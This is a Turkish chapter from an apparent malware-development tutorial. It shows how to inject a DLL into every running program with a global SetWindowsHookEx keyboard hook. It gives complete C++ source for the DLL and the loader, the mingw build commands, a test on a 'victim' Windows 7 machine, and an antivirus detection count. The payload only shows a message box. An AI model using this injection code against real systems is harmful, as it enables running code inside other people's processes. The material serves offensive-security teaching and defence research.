\newpage
\subsection{17. SetWindowsHookEx ile klasik DLL enjeksiyonu. Basit C++ zararlı yazılım.}

﷽

![dll injection](./images/25/2021-11-24_18-00.png){width="80%"}    

Bu eğitimde, `SetWindowsHookEx` yöntemiyle DLL enjeksiyonunu inceleyeceğim.     

### SetWindowsHookEx

Bu tekniği gösteren bir örneğe bakalım. `SetWindowsHookEx`, bir kanca zincirine bir kanca işlevi kurar ve belirli olaylar tetiklendiğinde çağrılır. İşlev söz dizimine bakalım:     

```cpp
HHOOK SetWindowsHookExA(
  [in] int       idHook,
  [in] HOOKPROC  lpfn,
  [in] HINSTANCE hmod,
  [in] DWORD     dwThreadId
);
```

Buradaki en önemli parametre `idHook`'dur. Yüklenecek kancanın türünü belirler ve aşağıdaki değerlerden birini alabilir:    

    WH_CALLWNDPROC
    WH_CALLWNDPROCRET
    WH_CBT
    WH_DEBUG
    WH_FOREGROUNDIDLE
    WH_GETMESSAGE
    WH_JOURNALPLAYBACK
    WH_JOURNALRECORD
    WH_KEYBOARD
    WH_KEYBOARD_LL
    WH_MOUSE
    WH_MOUSE_LL
    WH_MSGFILTER
    WH_SHELL
    WH_SYSMSGFILTER

Bizim durumumuzda, tuş vuruşu mesajlarını izlememize olanak tanıyan `WH_KEYBOARD` türündeki bir olayı kancalayacağım.     

### zararlı DLL

Zararlı DLL'imizi hazırlayalım. Basitlik adına, yalnızca bir mesaj kutusu açan bir DLL oluşturuyoruz:       

```cpp
/*
evil.cpp
simple DLL for DLL inject to process
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/11/25/malware-injection-7.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, 
DWORD nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}

extern "C" __declspec(dllexport) int Meow() {
  MessageBox(
    NULL,
    "Meow from evil.dll!",
    "=^..^=",
    MB_OK
  );
  return 0;
}

```

Gördüğünüz gibi, oldukça basit bir DLL'imiz var. `DllMain()` işlevi, DLL sürecin adres alanına yüklendiğinde çağrılır. Ayrıca `Meow()` adlı bir işlev var, bu işlev dışa aktarılan bir işlevdir ve sadece *"Meow from evil.dll!"* mesajını gösterir.

### örnek. basit zararlı yazılım.

Bir sonraki adım, zararlı yazılımımızı oluşturmaktır. Kaynak koduna bakalım:     

```cpp
/*
hack.cpp
DLL inject via SetWindowsHookEx
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/11/25/malware-injection-7.html
*/
#include <windows.h>
#include <cstdio>

typedef int (__cdecl *MeowProc)();

int main(void) {
  HINSTANCE meowDll;
  MeowProc meowFunc;
  // load evil DLL
  meowDll = LoadLibrary(TEXT("evil.dll"));

  // get the address of exported function from evil DLL
  meowFunc = (MeowProc) GetProcAddress(meowDll, "Meow");

  // install the hook - using the WH_KEYBOARD action
  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, 
  (HOOKPROC)meowFunc, meowDll, 0);
  Sleep(5*1000);
  UnhookWindowsHookEx(hook);

  return 0;
}
```

Gördüğünüz gibi, oldukça basit. İlk olarak, zararlı DLL'imizi yüklemek için `LoadLibrary` işlevini çağırıyoruz:    

![dll injection 2](./images/25/2021-11-25_15-35.png){width="80%"}    

Daha sonra, dışa aktarılan `Meow` işlevinin adresini almak için `GetProcAddress` işlevini çağırıyoruz:     

![dll injection 3](./images/25/2021-11-25_15-36.png){width="80%"}    

Ardından, zararlı yazılımımız en önemli işlevi, `SetWindowsHookEx` işlevini çağırır. Bu işlevin aldığı parametreler, işlevin aslında ne yapacağını belirler:     

![dll injection 4](./images/25/2021-11-25_15-40.png){width="80%"}    

Gördüğünüz gibi, klavye olayı gerçekleştiğinde, işlevimiz çağrılacaktır. Ayrıca, dışa aktarılan işlevimizin adresini (`meowFunc` parametresi) ve DLL'imizin işleyicisini (`meowDll` parametresi) geçiyoruz. Son parametre olan `0`, yalnızca belirli bir programı değil, tüm programları kancalamak istediğimizi belirtir, yani bu bir global kanca olur.     
Daha sonra, kancamızın çalıştığını göstermek için `Sleep` işlevini çağırıyoruz:      

![dll injection 5](./images/25/2021-11-25_15-44.png){width="80%"}    

Ve ardından, daha önce kancalanmış olan `WH_KEYBOARD` olayını kaldırmak için `UnhookWindowsHookEx()` işlevini çağırıyoruz:     

![dll injection 6](./images/25/2021-11-25_15-46.png){width="80%"}    

Son olarak, zararlı yazılım kodunun tamamını anladıktan sonra, bunu test edebiliriz. 
İlk olarak, zararlı DLL'i derleyelim:      

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.cpp -fpermissive
```

![dll injection 7](./images/25/2021-11-25_15-48.png){width="80%"}    

daha sonra zararlı yazılım kodunu derleyelim:     
```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive
```

![dll injection 8](./images/25/2021-11-25_15-50.png){width="80%"}    

Şimdi, her şeyi eylemde görmek için `hack.exe`'yi kurban makinede başlatalım (benim durumumda `Windows 7 x64`):

```powershell
.\hack.exe
```

![dll injection 9](./images/25/2021-11-25_15-54.png){width="80%"}    

Görüyoruz ki, her şey başarıyla tamamlandı ve bu noktada, bir program başlattığımızda, yalnızca klavye tuşuna basıldığında mesajımız açılıyor.     

### Sonuç

Bu bölümde, `SetWindowsHookEx` işlevini kullanarak bir DLL'i bir sürecin adres alanına nasıl enjekte edebileceğimizi ve bu adres alanında rastgele kod nasıl çalıştırabileceğimizi gösterdim.       

Ancak, bu tekniğin bir sınırlaması vardır. Bu teknik, benim Windows 10 x64 makinemde çalışmıyor. Bunun nedeni şu olabilir: CIG bu tekniği engelliyor. Windows 10 x64 iki önemli özelliğe sahiptir:      

- **CFG (Control Flow Guard)** - onaylanmamış adreslere dolaylı çağrıları engeller.
- **CIG (Code Integrity Guard)** - yalnızca Microsoft/Microsoft Store/WHQL tarafından imzalanmış modüllerin süreç belleğine yüklenmesine izin verir.     

BlackHat USA 2019'daki [bu](https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf) sunumda, yazarlar CIG'nin bu tekniği nasıl engellediğini açıklıyor.

Şimdi `hack.exe` dosyamızı virustotal'a yükleyelim:

![dll injection 10](./images/25/2021-11-26_03-02.png){width="80%"}    

[https://www.virustotal.com/gui/file/273e191999eb6a4bc010eeaf9c4e196d917509250f87a121fa1cfeded41b7921](https://www.virustotal.com/gui/file/273e191999eb6a4bc010eeaf9c4e196d917509250f87a121fa1cfeded41b7921)    

**Gördüğünüz gibi, 67 antivirüs motorundan 5 tanesi dosyamızı zararlı olarak algıladı.**    

[BlackHat USA 2019 process injection techniques Gotta Catch Them All](https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf)     
[SetWindowsHookEx](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)    
[Using Hooks MSDN](https://docs.microsoft.com/en-us/windows/win32/winmsg/using-hooks)    
[Exporting from a DLL](https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll-using-declspec-dllexport?view=msvc-170)        
[Github'taki kaynak kod:](https://github.com/cocomelonc/2021-11-24-malware-injection-7)    
